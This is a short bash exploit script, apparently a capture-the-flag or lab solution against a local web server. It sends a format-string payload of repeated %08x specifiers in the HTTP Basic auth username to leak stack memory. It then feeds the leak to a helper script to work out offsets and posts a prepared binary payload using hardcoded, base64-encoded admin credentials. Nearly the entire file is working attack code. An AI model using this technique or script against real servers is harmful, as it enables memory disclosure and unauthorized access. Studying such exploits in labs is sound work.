# $ bash run.sh 2184 232

offset_addr=$1
offset_stack=$2

auth_local="dGVzdDp0ZXN0"  # base64(<your local user>:md5(<your local password>))
auth_chatzi="YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ=="  #base64( admin:md5(bob's your uncle) )

if [ $# -eq 3 ]; then  # Run with a 3rd dummy arg to reproduce locally
	auth=$auth_local
else
	auth=$auth_chatzi
fi

get_payload="'Hello %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x \
%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x :dsa'"

curl -v 'http://localhost:8000/' -u "${get_payload}" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' --compressed \
-H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0, no-cache' \
-H 'Origin: http://localhost:8000' -H 'Pragma: no-cache' 2> out_temp.tmp

cat out_temp.tmp | grep "WWW" | python3 process_answer.py 0 $offset_addr $offset_stack

rm -f out_temp.tmp

curl -v 'http://localhost:8000/ultimate.html' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
-H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Authorization: Basic '$auth -H 'Connection: keep-alive' \
-H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0, no-cache' -H 'Origin: http://localhost:8000' -H 'Pragma: no-cache' \
-H 'Content-Length: 15' --data-binary '@full_payload.bin'